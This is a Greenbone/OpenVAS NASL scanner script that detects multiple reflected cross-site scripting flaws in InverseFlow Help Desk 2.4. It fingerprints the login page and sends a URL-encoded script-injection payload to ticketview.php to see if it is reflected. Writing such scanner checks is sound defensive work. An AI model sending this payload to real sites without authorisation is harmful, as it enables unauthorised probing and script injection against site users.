if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103311" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2011-10-25 14:02:26 +0200 (Tue, 25 Oct 2011)" );
	script_bugtraq_id( 50344 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_name( "InverseFlow Multiple Cross Site Scripting Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/50344" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "InverseFlow is prone to multiple cross-site scripting
  vulnerabilities because the application fails to sufficiently sanitize user-supplied data." );
	script_tag( name: "impact", value: "An attacker could exploit these vulnerabilities to execute arbitrary
  script code in the context of the affected website. This may allow the attacker to steal
  cookie-based authentication credentials and launch other attacks." );
	script_tag( name: "affected", value: "InverseFlow 2.4 is vulnerable. Other versions may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since
  the disclosure of this vulnerability. Likely none will be provided anymore. General solution options
  are to upgrade to a newer release, disable respective features, remove the product or replace the
  product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
vt_strings = get_vt_strings();
for dir in nasl_make_list_unique( "/inverseflow", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	buf = http_get_cache( item: dir + "/login.php", port: port );
	if(!buf || !IsMatchRegexp( buf, "^HTTP/1\\.[01] 200" ) || ( !ContainsString( buf, "InverseFlow Help Desk User Login" ) && !ContainsString( buf, "InverseFlow. All Rights Reserved" ) && !ContainsString( buf, "InverseFlow.com" ) )){
		continue;
	}
	url = NASLString( dir, "/ticketview.php?email=%22%3E%3Cscript%3Ealert(/", vt_strings["lowercase"], "/)%3C/script%3E&id=1" );
	if(http_vuln_check( port: port, url: url, pattern: "<script>alert\\(/" + vt_strings["lowercase"] + "/\\)</script>", check_header: TRUE )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

